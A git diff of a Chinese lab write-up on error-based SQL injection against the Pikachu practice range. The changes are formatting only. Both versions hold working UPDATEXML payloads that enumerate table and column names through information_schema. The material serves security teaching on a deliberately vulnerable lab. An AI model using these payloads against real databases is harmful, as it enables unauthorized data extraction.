@@ -918,10 +918,10 @@ select/insert/update/delete 都可以使用报错来获取信息.
 
 - **UPDATEXML(xml_document,XPathstring,new_value)**
 
-    Updatexml() 函数作用:改变(查找并替换)XML文档中符合条件的节点的值.
-    - 第一个参数:fiedname是String格式,为表中的字段名.
-    - 第二个参数:XPathstring(Xpath格式的字符串).
-    - 第三个参数:new_value,String格式,替换查找到的符合条件的 X
+    Updatexml() 函数作用:改变(查找并替换)XML 文档中符合条件的节点的值.
+    - 第一个参数 : fiedname 是 String 格式,为表中的字段名.
+    - 第二个参数 : XPathstring(Xpath 格式的字符串).
+    - 第三个参数 : new_value,String 格式,替换查找到的符合条件的 X
 
 改变 XML_document 中符合 XPATH_string 的值
 
@@ -933,7 +933,7 @@ select/insert/update/delete 都可以使用报错来获取信息.
 
 ![](../../../../../assets/img/安全/实验/Web/靶场/pikachu/35.png)
 
-输入 `a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#` 更改limit后面的数字pikachu'limit 0,爆表名
+输入 `a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#` 更改 limit 后面的数字 pikachu'limit 0,爆表名
 
 ![](../../../../../assets/img/安全/实验/Web/靶场/pikachu/36.png)
 
@@ -941,7 +941,7 @@ select/insert/update/delete 都可以使用报错来获取信息.
 
 ![](../../../../../assets/img/安全/实验/Web/靶场/pikachu/38.png)
 
-字段名 `a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)#` 更改limit后面的数字,爆表名
+字段名 `a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)#` 更改 limit 后面的数字,爆表名
 
 ![](../../../../../assets/img/安全/实验/Web/靶场/pikachu/39.png)
 
